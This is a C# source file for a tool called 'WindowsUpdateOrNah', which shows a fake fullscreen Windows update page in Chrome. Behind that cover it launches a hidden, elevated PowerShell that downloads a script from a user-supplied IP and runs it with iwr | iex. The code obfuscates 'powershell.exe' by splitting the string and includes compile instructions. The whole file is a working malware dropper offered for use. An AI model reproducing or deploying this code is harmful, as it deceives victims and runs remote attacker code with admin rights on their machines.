/*WindowsUpdateOrNah is C# code that allows you to run a fake Windows update on a computer and execute another task along with.
This program interacts with PowerShell to perform the update screen and execute your downloaded command as a String (As Admin).

Remember to add your host IP and document you wish to parse.

Also, the fake Windows update works best with one monitor or screen and requires Chrome to be installed.

To compile, use the command below
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:filename.exe .\windowsupdateornah.cs.txt
*/

//Defining the scope
using System;
using System.Diagnostics;

//Adding a level of separation
namespace UpdateitWin
{   //Create the class for the object
    class Chore
    {   //Which cmdline are you going with below.
        private const string DMC = "p" + "o" + "w" + "e" + "r" + "s" + "h" + "e" + "l" + "l" + "." + "e" + "x" + "e";
		//Interact with PowerShell to use a Fake Windows update screen and execute your downloaded command as a String (As Admin).                                                                                                                             Add Your IP, Directory, and filename
        private const string DMC1 = @"& {start chrome https://fakeupdate.net/win10ue/,--start-fullscreen; $dmcline = 'p' + 'ower' + 'sh' + 'e' + 'l' + 'l' + '.' + 'e' + 'xe'; start $dmcline -argumentlist '-noexit -windowstyle hidden (iwr http://< YOUR IP >/< DIRECTORY/filename.txt -UseBasicParsing) | iex' -verb runas}";
		//Main
        static void Main(string[] args)
        {	//How you want to interact with the PowerShell console
            ProcessStartInfo upd8t = new ProcessStartInfo();
			upd8t.RedirectStandardError = true;
            upd8t.RedirectStandardOutput = true;
            upd8t.UseShellExecute = false;
            upd8t.CreateNoWindow = true;
            upd8t.FileName = DMC;
            upd8t.Arguments = DMC1;
            
			//Start cmdline execution within Powershell
            Process job = new Process();
            job.StartInfo = upd8t;
            job.Start();
        }
    }
}